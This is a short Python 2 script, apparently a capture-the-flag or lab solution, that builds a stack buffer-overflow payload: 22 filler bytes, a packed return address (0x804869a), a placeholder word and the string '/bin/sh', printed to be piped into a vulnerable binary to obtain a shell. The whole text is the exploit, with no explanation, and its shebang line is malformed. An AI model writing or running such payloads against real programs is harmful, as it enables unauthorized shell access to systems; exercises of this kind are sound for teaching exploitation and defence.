#/user/bin/bash/python
from struct import pack
filler = "C"*22
return_address = pack("<I", 0x804869a)
test_addr = pack("<I", 0xffffffff)
shell_command = "/bin/sh"
print filler + return_address + test_addr + shell_command